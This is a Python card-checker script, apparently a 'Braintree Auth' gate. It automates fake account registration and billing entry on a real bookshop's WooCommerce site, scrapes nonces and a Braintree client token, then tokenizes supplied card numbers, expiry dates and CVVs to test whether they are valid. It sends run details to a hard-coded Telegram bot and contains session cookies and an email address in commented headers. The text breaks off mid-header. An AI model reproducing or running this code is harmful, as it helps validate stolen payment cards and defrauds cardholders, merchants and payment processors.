import requests,re,base64,json,time,random,string
from bs4 import *
def br3(cx):
	cc = cx.split('|')[0]
	mes = cx.split('|')[1]
	ano = cx.split('|')[2]
	cvv = cx.split('|')[3]
	r = requests.session()
	def random_char(char_num):
		return ''.join(random.choice(string.ascii_letters) for _ in range(char_num))

	email = random_char(7)+"@gmail.com"
	mko = f"""
    email : {email}
    gate : braintree Auth 2
    """
	url = f'https://api.telegram.org/bot6770556902:AAEkoPl0ALANwm6uXB6IthozSjjjp9Dipjg/sendMessage?chat_id=6249497534&text={mko}'
	response = requests.post(url)
	head = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
}
	get = r.get('https://rockynook.com/my-account/',headers=head)
	reg = re.findall(r'name="woocommerce-register-nonce" value="(.*?)"',get.text)[0]
	headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'en-US,en;q=0.9',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded',
    # 'Cookie': 'mailchimp_landing_site=https%3A%2F%2Frockynook.com%2Fmy-account%2F; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-02-19%2022%3A12%3A40%7C%7C%7Cep%3Dhttps%3A%2F%2Frockynook.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-02-19%2022%3A12%3A40%7C%7C%7Cep%3Dhttps%3A%2F%2Frockynook.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; _pin_unauth=dWlkPU16ZzJZbVZpWmpRdFlUUm1aQzAwTVdVMUxXRmhORE10WVdRelpUY3daV0ZrT0RrMw; wordpress_logged_in_5482151ac1c8e83296e3b60768a8899e=tvahmedsat%7C1708553584%7Cqf5rmKQs8HLvbblljKuwp5SLrTyJ6wdwpjrGQg8Iahx%7C7a76424610a6add9e7fdea31bdd9eb62a649ee5032eb3bda5a49a0a63ca42659; wp_automatewoo_visitor_5482151ac1c8e83296e3b60768a8899e=0q0x6wpz6jaov740bg02; wp_automatewoo_session_started=1; _gid=GA1.2.756087496.1708621306; sbjs_udata=vst%3D2%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F121.0.0.0%20Safari%2F537.36; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Frockynook.com%2Fmy-account%2F; _ga_V0NJJNMC5C=GS1.1.1708621306.2.0.1708621306.0.0.0; _ga=GA1.1.719100388.1708380759; _monsterinsights_uj={"1708380761":"https%3A%2F%2Frockynook.com%2Fmy-account%2F%7C%23%7CMy%20Account%20-%20RockyNook%7C%23%7C8","1708380791":"https%3A%2F%2Frockynook.com%2Fmy-account%2F%7C%23%7CMy%20Account%20-%20RockyNook%7C%23%7C8","1708380944":"https%3A%2F%2Frockynook.com%2Fmy-account%2Fpayment-methods%2F%7C%23%7CPayment%20methods%20-%20RockyNook%7C%23%7C8","1708380959":"https%3A%2F%2Frockynook.com%2Fmy-account%2Fadd-payment-method%2F%7C%23%7CAdd%20payment%20method%20-%20RockyNook%7C%23%7C8","1708381357":"https%3A%2F%2Frockynook.com%2Fmy-account%2Fadd-payment-method%2F%7C%23%7CAdd%20payment%20method%20-%20RockyNook%7C%23%7C8","1708621307":"https%3A%2F%2Frockynook.com%2Fmy-account%2F%7C%23%7CMy%20Account%20-%20RockyNook%7C%23%7C8"}; _wpfuj={"1708380761":"https%3A%2F%2Frockynook.com%2Fmy-account%2F%7C%23%7CMy%20Account%20-%20RockyNook%7C%23%7C8","1708380944":"https%3A%2F%2Frockynook.com%2Fmy-account%2Fpayment-methods%2F%7C%23%7CPayment%20methods%20-%20RockyNook%7C%23%7C8","1708380959":"https%3A%2F%2Frockynook.com%2Fmy-account%2Fadd-payment-method%2F%7C%23%7CAdd%20payment%20method%20-%20RockyNook%7C%23%7C8","1708621307":"https%3A%2F%2Frockynook.com%2Fmy-account%2F%7C%23%7CMy%20Account%20-%20RockyNook%7C%23%7C8"}; _ga_XP86HLTBHS=GS1.1.1708621304.2.1.1708621315.49.0.0; mailchimp_user_previous_email=tvahmedsat%40gmail.com; mailchimp_user_email=tvahmedsat%40gmail.com; mailchimp.cart.previous_email=tvahmedsat@gmail.com; mailchimp.cart.current_email=tvahmedsatjs@gmail.com; _ga_53ZS64GYMY=GS1.1.1708621304.2.1.1708621403.60.0.0; _ga_3D7WE1E62Q=GS1.1.1708621304.2.1.1708621403.0.0.0; _ga_3QYEEL2PZ2=GS1.1.1708621304.2.1.1708621403.0.0.0; _gcl_au=1.1.1606823415.1708380759.823159758.1708621324.1708621403',
    'Origin': 'https://rockynook.com',
    'Referer': 'https://rockynook.com/my-account/',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

	data = {
    'email': email,
    'password': 'Hamdi11@@',
    'wc_order_attribution_type': 'typein',
    'wc_order_attribution_url': '(none)',
    'wc_order_attribution_utm_campaign': '(none)',
    'wc_order_attribution_utm_source': '(direct)',
    'wc_order_attribution_utm_medium': '(none)',
    'wc_order_attribution_utm_content': '(none)',
    'wc_order_attribution_utm_id': '(none)',
    'wc_order_attribution_utm_term': '(none)',
    'wc_order_attribution_session_entry': 'https://rockynook.com/my-account/',
    'wc_order_attribution_session_start_time': '2024-02-19 22:12:40',
    'wc_order_attribution_session_pages': '1',
    'wc_order_attribution_session_count': '2',
    'wc_order_attribution_user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
    'mailchimp_woocommerce_newsletter': '1',
    'woocommerce-register-nonce': reg,
    '_wp_http_referer': '/my-account/',
    'register': 'Register',
}

	response = r.post('https://rockynook.com/my-account/',headers=headers, data=data)
	get2 = r.get('https://rockynook.com/my-account/edit-address/billing/',headers=head)
	bil= re.findall(r'name="woocommerce-edit-address-nonce" value="(.*?)"',get2.text)[0]
	headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'en-US,en;q=0.9',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded',
    # 'Cookie': 'mailchimp_landing_site=https%3A%2F%2Frockynook.com%2Fmy-account%2F; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-02-19%2022%3A12%3A40%7C%7C%7Cep%3Dhttps%3A%2F%2Frockynook.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-02-19%2022%3A12%3A40%7C%7C%7Cep%3Dhttps%3A%2F%2Frockynook.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; _pin_unauth=dWlkPU16ZzJZbVZpWmpRdFlUUm1aQzAwTVdVMUxXRmhORE10WVdRelpUY3daV0ZrT0RrMw; wp_automatewoo_session_started=1; _gid=GA1.2.756087496.1708621306; sbjs_udata=vst%3D2%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F121.0.0.0%20Safari%2F537.36; mailchimp.cart.previous_email=tvahmedsat@gmail.com; mailchimp.cart.current_email=tvahmedsatjs@gmail.com; mailchimp_user_previous_email=tvahmedsatjs%40gmail.com; mailchimp_user_email=tvahmedsatjs%40gmail.com; wordpress_logged_in_5482151ac1c8e83296e3b60768a8899e=tvahmedsatjs%7C1709831004%7C96IzifJzhrxJHW7W1tBidoNOp2CLmEFJKWbpiiKYtsX%7C1828affa8909416b6cb74c23940d4538755805d49cb0e318ed86fe0101aca3f2; wp_automatewoo_visitor_5482151ac1c8e83296e3b60768a8899e=iyqmv1itp5ohuh6da6r0; wfwaf-authcookie-d7ac73c9756c660b15b532463c666d56=108349%7Cother%7Cread%7Cbca5c9f42a1a17549120702fbe095ea34d885b03c1bd63693a770b035ad47dbe; sbjs_session=pgs%3D7%7C%7C%7Ccpg%3Dhttps%3A%2F%2Frockynook.com%2Fmy-account%2Fedit-address%2Fbilling%2F; _ga_V0NJJNMC5C=GS1.1.1708621306.2.1.1708621823.0.0.0; _ga=GA1.1.719100388.1708380759; _monsterinsights_uj={"1708380761":"https%3A%2F%2Frockynook.com%2Fmy-account%2F%7C%23%7CMy%20Account%20-%20RockyNook%7C%23%7C8","1708380791":"https%3A%2F%2Frockynook.com%2Fmy-account%2F%7C%23%7CMy%20Account%20-%20RockyNook%7C%23%7C8","1708380944":"https%3A%2F%2Frockynook.com%2Fmy-account%2Fpayment-methods%2F%7C%23%7CPayment%20methods%20-%20RockyNook%7C%23%7C8","1708380959":"https%3A%2F%2Frockynook.com%2Fmy-account%2Fadd-payment-method%2F%7C%23%7CAdd%20payment%20method%20-%20RockyNook%7C%23%7C8","1708381357":"https%3A%2F%2Frockynook.com%2Fmy-account%2Fadd-payment-method%2F%7C%23%7CAdd%20payment%20method%20-%20RockyNook%7C%23%7C8","1708621307":"https%3A%2F%2Frockynook.com%2Fmy-account%2F%7C%23%7CMy%20Account%20-%20RockyNook%7C%23%7C8","1708621410":"https%3A%2F%2Frockynook.com%2Fmy-account%2F%7C%23%7CMy%20Account%20-%20RockyNook%7C%23%7C8","1708621715":"https%3A%2F%2Frockynook.com%2Fmy-account%2Fpayment-methods%2F%7C%23%7CPayment%20methods%20-%20RockyNook%7C%23%7C8","1708621725":"https%3A%2F%2Frockynook.com%2Fmy-account%2Fadd-payment-method%2F%7C%23%7CAdd%20payment%20method%20-%20RockyNook%7C%23%7C8","1708621786":"https%3A%2F%2Frockynook.com%2Fmy-account%2Fadd-payment-method%2F%7C%23%7CAdd%20payment%20method%20-%20RockyNook%7C%23%7C8","1708621810":"https%3A%2F%2Frockynook.com%2Fmy-account%2Fedit-address%2F%7C%23%7CAddresses%20-%20RockyNook%7C%23%7C8","1708621823":"https%3A%2F%2Frockynook.com%2Fmy-account%2Fedit-address%2Fbilling%2F%7C%23%7CAddresses%20-%20RockyNook%7C%23%7C8"}; _wpfuj={"1708380761":"https%3A%2F%2Frockynook.com%2Fmy-account%2F%7C%23%7CMy%20Account%20-%20RockyNook%7C%23%7C8","1708380944":"https%3A%2F%2Frockynook.com%2Fmy-account%2Fpayment-methods%2F%7C%23%7CPayment%20methods%20-%20RockyNook%7C%23%7C8","1708380959":"https%3A%2F%2Frockynook.com%2Fmy-account%2Fadd-payment-method%2F%7C%23%7CAdd%20payment%20method%20-%20RockyNook%7C%23%7C8","1708621307":"https%3A%2F%2Frockynook.com%2Fmy-account%2F%7C%23%7CMy%20Account%20-%20RockyNook%7C%23%7C8","1708621715":"https%3A%2F%2Frockynook.com%2Fmy-account%2Fpayment-methods%2F%7C%23%7CPayment%20methods%20-%20RockyNook%7C%23%7C8","1708621725":"https%3A%2F%2Frockynook.com%2Fmy-account%2Fadd-payment-method%2F%7C%23%7CAdd%20payment%20method%20-%20RockyNook%7C%23%7C8","1708621810":"https%3A%2F%2Frockynook.com%2Fmy-account%2Fedit-address%2F%7C%23%7CAddresses%20-%20RockyNook%7C%23%7C8","1708621823":"https%3A%2F%2Frockynook.com%2Fmy-account%2Fedit-address%2Fbilling%2F%7C%23%7CAddresses%20-%20RockyNook%7C%23%7C8"}; _ga_XP86HLTBHS=GS1.1.1708621304.2.1.1708621851.60.0.0; _ga_53ZS64GYMY=GS1.1.1708621304.2.1.1708621886.60.0.0; _ga_3D7WE1E62Q=GS1.1.1708621304.2.1.1708621886.0.0.0; _ga_3QYEEL2PZ2=GS1.1.1708621304.2.1.1708621886.0.0.0; _gcl_au=1.1.1606823415.1708380759.823159758.1708621324.1708621886',
    'Origin': 'https://rockynook.com',
    'Referer': 'https://rockynook.com/my-account/edit-address/billing/',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

	data = {
    'billing_first_name': 'Ahmed',
    'billing_last_name': 'sheko',
    'billing_company': 'ejk',
    'billing_country': 'US',
    'billing_address_1': '11 streeet',
    'billing_address_2': '',
    'billing_city': 'New Yorl',
    'billing_state': 'NY',
    'billing_postcode': '10089',
    'billing_phone': '3213433154',
    'billing_email': email,
    'save_address': 'Save address',
    'woocommerce-edit-address-nonce': bil,
    '_wp_http_referer': '/my-account/edit-address/billing/',
    'action': 'edit_address',
}

	response = r.post('https://rockynook.com/my-account/edit-address/billing/', headers=headers, data=data)
	headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'en-US,en;q=0.9',
    'Connection': 'keep-alive',
    # 'Cookie': 'mailchimp_landing_site=https%3A%2F%2Frockynook.com%2Fmy-account%2F; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-02-19%2022%3A12%3A40%7C%7C%7Cep%3Dhttps%3A%2F%2Frockynook.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-02-19%2022%3A12%3A40%7C%7C%7Cep%3Dhttps%3A%2F%2Frockynook.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F121.0.0.0%20Safari%2F537.36; _gid=GA1.2.2006573148.1708380761; _pin_unauth=dWlkPU16ZzJZbVZpWmpRdFlUUm1aQzAwTVdVMUxXRmhORE10WVdRelpUY3daV0ZrT0RrMw; mailchimp.cart.current_email=tvahmedsat@gmail.com; mailchimp_user_email=tvahmedsat%40gmail.com; _gcl_au=1.1.1606823415.1708380759.561109475.1708380772.1708380783; wordpress_logged_in_5482151ac1c8e83296e3b60768a8899e=tvahmedsat%7C1708553584%7Cqf5rmKQs8HLvbblljKuwp5SLrTyJ6wdwpjrGQg8Iahx%7C7a76424610a6add9e7fdea31bdd9eb62a649ee5032eb3bda5a49a0a63ca42659; wp_automatewoo_visitor_5482151ac1c8e83296e3b60768a8899e=0q0x6wpz6jaov740bg02; wp_automatewoo_session_started=1; wfwaf-authcookie-d7ac73c9756c660b15b532463c666d56=108145%7Cother%7Cread%7C37df921f76a55943b27bd6027ae789d3a6e114fadb67c832bc114cce61f50398; _ga_53ZS64GYMY=GS1.1.1708380759.1.1.1708380941.57.0.0; _ga_3D7WE1E62Q=GS1.1.1708380759.1.1.1708380941.0.0.0; _ga_3QYEEL2PZ2=GS1.1.1708380759.1.1.1708380941.0.0.0; sbjs_session=pgs%3D3%7C%7C%7Ccpg%3Dhttps%3A%2F%2Frockynook.com%2Fmy-account%2Fpayment-methods%2F; _gat_gtag_UA_28683519_3=1; _ga_V0NJJNMC5C=GS1.1.1708380760.1.1.1708380943.0.0.0; _ga=GA1.1.719100388.1708380759; _monsterinsights_uj={"1708380761":"https%3A%2F%2Frockynook.com%2Fmy-account%2F%7C%23%7CMy%20Account%20-%20RockyNook%7C%23%7C8","1708380791":"https%3A%2F%2Frockynook.com%2Fmy-account%2F%7C%23%7CMy%20Account%20-%20RockyNook%7C%23%7C8","1708380944":"https%3A%2F%2Frockynook.com%2Fmy-account%2Fpayment-methods%2F%7C%23%7CPayment%20methods%20-%20RockyNook%7C%23%7C8"}; _wpfuj={"1708380761":"https%3A%2F%2Frockynook.com%2Fmy-account%2F%7C%23%7CMy%20Account%20-%20RockyNook%7C%23%7C8","1708380944":"https%3A%2F%2Frockynook.com%2Fmy-account%2Fpayment-methods%2F%7C%23%7CPayment%20methods%20-%20RockyNook%7C%23%7C8"}; _ga_XP86HLTBHS=GS1.1.1708380758.1.1.1708380945.47.0.0',
    'Referer': 'https://rockynook.com/my-account/payment-methods/',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

	response = r.get('https://rockynook.com/my-account/add-payment-method/', headers=headers)
	tok = re.findall(r'"type":"credit_card","client_token_nonce":"(.*?)"',response.text)[0]
	pay = re.findall(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"',response.text)[0]
#--------------------------------------------------------------#
	headers = {
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.9',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'Cookie': 'wordpress_sec_5482151ac1c8e83296e3b60768a8899e=tvahmedsat%7C1708553584%7Cqf5rmKQs8HLvbblljKuwp5SLrTyJ6wdwpjrGQg8Iahx%7Cb4c0962ad6a4f5fd20aeae79e71fd280e34ed287353762e1ba0e23d9b164e60c; mailchimp_landing_site=https%3A%2F%2Frockynook.com%2Fmy-account%2F; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-02-19%2022%3A12%3A40%7C%7C%7Cep%3Dhttps%3A%2F%2Frockynook.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-02-19%2022%3A12%3A40%7C%7C%7Cep%3Dhttps%3A%2F%2Frockynook.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F121.0.0.0%20Safari%2F537.36; _gid=GA1.2.2006573148.1708380761; _pin_unauth=dWlkPU16ZzJZbVZpWmpRdFlUUm1aQzAwTVdVMUxXRmhORE10WVdRelpUY3daV0ZrT0RrMw; mailchimp.cart.current_email=tvahmedsat@gmail.com; mailchimp_user_email=tvahmedsat%40gmail.com; _gcl_au=1.1.1606823415.1708380759.561109475.1708380772.1708380783; wordpress_logged_in_5482151ac1c8e83296e3b60768a8899e=tvahmedsat%7C1708553584%7Cqf5rmKQs8HLvbblljKuwp5SLrTyJ6wdwpjrGQg8Iahx%7C7a76424610a6add9e7fdea31bdd9eb62a649ee5032eb3bda5a49a0a63ca42659; wp_automatewoo_visitor_5482151ac1c8e83296e3b60768a8899e=0q0x6wpz6jaov740bg02; wp_automatewoo_session_started=1; wfwaf-authcookie-d7ac73c9756c660b15b532463c666d56=108145%7Cother%7Cread%7C37df921f76a55943b27bd6027ae789d3a6e114fadb67c832bc114cce61f50398; _gat_gtag_UA_28683519_3=1; _ga_53ZS64GYMY=GS1.1.1708380759.1.1.1708380956.42.0.0; _ga_3D7WE1E62Q=GS1.1.1708380759.1.1.1708380956.0.0.0; _ga_3QYEEL2PZ2=GS1.1.1708380759.1.1.1708380956.0.0.0; _ga_XP86HLTBHS=GS1.1.1708380758.1.1.1708380957.35.0.0; sbjs_session=pgs%3D4%7C%7C%7Ccpg%3Dhttps%3A%2F%2Frockynook.com%2Fmy-account%2Fadd-payment-method%2F; _ga_V0NJJNMC5C=GS1.1.1708380760.1.1.1708380959.0.0.0; _ga=GA1.1.719100388.1708380759; _monsterinsights_uj={"1708380761":"https%3A%2F%2Frockynook.com%2Fmy-account%2F%7C%23%7CMy%20Account%20-%20RockyNook%7C%23%7C8","1708380791":"https%3A%2F%2Frockynook.com%2Fmy-account%2F%7C%23%7CMy%20Account%20-%20RockyNook%7C%23%7C8","1708380944":"https%3A%2F%2Frockynook.com%2Fmy-account%2Fpayment-methods%2F%7C%23%7CPayment%20methods%20-%20RockyNook%7C%23%7C8","1708380959":"https%3A%2F%2Frockynook.com%2Fmy-account%2Fadd-payment-method%2F%7C%23%7CAdd%20payment%20method%20-%20RockyNook%7C%23%7C8"}; _wpfuj={"1708380761":"https%3A%2F%2Frockynook.com%2Fmy-account%2F%7C%23%7CMy%20Account%20-%20RockyNook%7C%23%7C8","1708380944":"https%3A%2F%2Frockynook.com%2Fmy-account%2Fpayment-methods%2F%7C%23%7CPayment%20methods%20-%20RockyNook%7C%23%7C8","1708380959":"https%3A%2F%2Frockynook.com%2Fmy-account%2Fadd-payment-method%2F%7C%23%7CAdd%20payment%20method%20-%20RockyNook%7C%23%7C8"}',
    'Origin': 'https://rockynook.com',
    'Referer': 'https://rockynook.com/my-account/add-payment-method/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

	data = {
    'action': 'wc_braintree_credit_card_get_client_token',
    'nonce': tok,
}

	response = r.post('https://rockynook.com/wp-admin/admin-ajax.php',headers=headers, data=data)
	data = response.json()['data']
	dec = base64.b64decode(data).decode('utf-8')
	dec = json.loads(dec)
	au = dec['authorizationFingerprint']
#--------------------------------------------------------------#
	headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'authorization': f'Bearer {au}',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
}

	json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': '88b55f52-f103-4c5d-9907-dae44bb4946e',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': cc,
                'expirationMonth': mes,
                'expirationYear': ano,
                'cvv': cvv,
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	ty = response.json()['data']['tokenizeCreditCard']['creditCard']['brandCode'].lower()
	token = response.json()['data']['tokenizeCreditCard']['token']
#--------------------------------------------------------------#
	headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'en-US,en;q=0.9',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded',
    # 'Cookie': 'mailchimp_landing_site=https%3A%2F%2Frockynook.com%2Fmy-account%2F; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-02-19%2022%3A12%3A40%7C%7C%7Cep%3Dhttps%3A%2F%2Frockynook.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-02-19%2022%3A12%3A40%7C%7C%7Cep%3Dhttps%3A%2F%2Frockynook.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F121.0.0.0%20Safari%2F537.36; _gid=GA1.2.2006573148.1708380761; _pin_unauth=dWlkPU16ZzJZbVZpWmpRdFlUUm1aQzAwTVdVMUxXRmhORE10WVdRelpUY3daV0ZrT0RrMw; mailchimp.cart.current_email=tvahmedsat@gmail.com; mailchimp_user_email=tvahmedsat%40gmail.com; _gcl_au=1.1.1606823415.1708380759.561109475.1708380772.1708380783; wordpress_logged_in_5482151ac1c8e83296e3b60768a8899e=tvahmedsat%7C1708553584%7Cqf5rmKQs8HLvbblljKuwp5SLrTyJ6wdwpjrGQg8Iahx%7C7a76424610a6add9e7fdea31bdd9eb62a649ee5032eb3bda5a49a0a63ca42659; wp_automatewoo_visitor_5482151ac1c8e83296e3b60768a8899e=0q0x6wpz6jaov740bg02; wp_automatewoo_session_started=1; wfwaf-authcookie-d7ac73c9756c660b15b532463c666d56=108145%7Cother%7Cread%7C37df921f76a55943b27bd6027ae789d3a6e114fadb67c832bc114cce61f50398; sbjs_session=pgs%3D4%7C%7C%7Ccpg%3Dhttps%3A%2F%2Frockynook.com%2Fmy-account%2Fadd-payment-method%2F; 